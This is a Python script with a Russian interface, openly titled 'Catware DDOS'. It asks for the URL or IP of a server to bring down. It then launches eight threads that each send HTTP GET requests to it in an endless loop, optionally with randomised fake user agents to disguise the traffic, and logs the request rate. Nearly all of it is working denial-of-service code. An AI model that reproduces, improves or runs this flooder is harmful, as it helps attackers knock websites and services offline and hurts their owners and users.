
#
# Catware DDOS
#

version = 0.0

print(f"""
                                                                                                 ▄▄▄▄▄█▄▄▄▄▄
 ██████  █████  ████████ ██     ██  █████  ██████  ███████     ██████  ██████   ██████  ███████  █   ▄█▄   █
██      ██   ██    ██    ██     ██ ██   ██ ██   ██ ██          ██   ██ ██   ██ ██    ██ ██      ▄█▄▄▄▄█▄▄▄▄█▄
██      ███████    ██    ██  █  ██ ███████ ██████  █████       ██   ██ ██   ██ ██    ██ ███████  █    █    █
██      ██   ██    ██    ██ ███ ██ ██   ██ ██   ██ ██          ██   ██ ██   ██ ██    ██      ██  █    █    █
 ██████ ██   ██    ██     ███ ███  ██   ██ ██   ██ ███████     ██████  ██████   ██████  ███████  ▀▀▀▀▀█▀▀▀▀▀

 │ Версия: {str(version)}
 │ Разработчики: catware.space
""")

print(" >>> Загрузка модулей...")
from threading import Thread
from requests import *
from fake_useragent import UserAgent
from random import choice, randint
ua = UserAgent()
from time import time, sleep
#from multiprocessing import Process

upstart = time()

THREADS = 8
getcount = 0
delay = 0.0
failure = 0
gspeed = 0.0
middle_ariphmetic = []
fstime = 0
pwtime = 0
enable_useragent = False

URL = input(" >>> Укажите URL или IP сервера, который необходимо уронить : ")

print(" >>> Конфигурация ============================== ")
print(f""" Количество потоков: {str(THREADS)}
 Задержка между запросами: {str(delay)}
 Fake UserAgent: {str(enable_useragent)}
 ===============================================""")

for x in range(4):
        sleep(1)

def snd(bt):
        #file = open("sound.txt", "a", encoding="utf-8")
        #file.write(bt)
        #file.close()
        pass

def getspeed(aye):
        #return int(start / getcount)
        #global middle_ariphmetic, pstart, getcount
        #middle = aye
        #for x in middle_ariphmetic:
        #       middle += x
        #snd("getspeed")
        #return 1 / float(middle / len(middle_ariphmetic))
        kol = getcount / aye
        return int(kol) / int(start)
def percent(frst, scnd):
        coef = 100 / frst
        gets = scnd * coef
        #snd("getpercent")
        return gets

def hit(url):
        #start = time()
        global count, getcount, failure, middle_ariphmetic
        alive = True
        while alive:
                try:
                        if enable_useragent:
                                useragent = ua.random
                        pstart = time()
                        sleep(delay)
                        if enable_useragent == False:
                                res = get(url)
                                t = res.text
                        elif enable_useragent:
                                res = get(url, headers={"User-Agent": useragent})
                                t = res.text
                        #res = get(url, headers={"User-Agent": useragent}).text
                        middle_ariphmetic.append(time() - pstart)
                        getcount += 1
                        print("+ Запрос: " + str(len(t)) + "байт, всего потоков: " + str(count) + ", запросов: " + str(getcount) + ", проблемных запросов: " + str(int(percent(getcount, failure))) + f"% ({str(failure)}), скорость: " + str(getspeed(time() - pstart)) + " запросов/сек, код ответа: " + str(res.status_code) + ", кодировка: " + str(res.encoding))
                        #print("! UserAgent: " + str(useragent))
                        if len(middle_ariphmetic) > 10:
                                middle_ariphmetic = middle_ariphmetic[:10]
                        #if start + 30 > time():
                        #       pass
                        #else:
                        #       alive = False
                except Exception as e:
                        print("Не удалось сделать запрос - " + str(e))
                        #middle_ariphmetic.append(time() - pstart)
                        failure += 1
        print("Завершена 30-секундная сессия hit")
start = time()
count = 0
while count < THREADS:
        count += 1
        try:
                exec("pid" + str(count) + f" = Thread(target=hit, args=(URL,))")
                exec("pid" + str(count) + ".start()")
                #exec("pid" + str(count) + ".join()")
                sleep(0.1)
                print("^ Запущен поток #" + str(count))
        except:
                print("V Не удалось запустить поток #" + str(count))
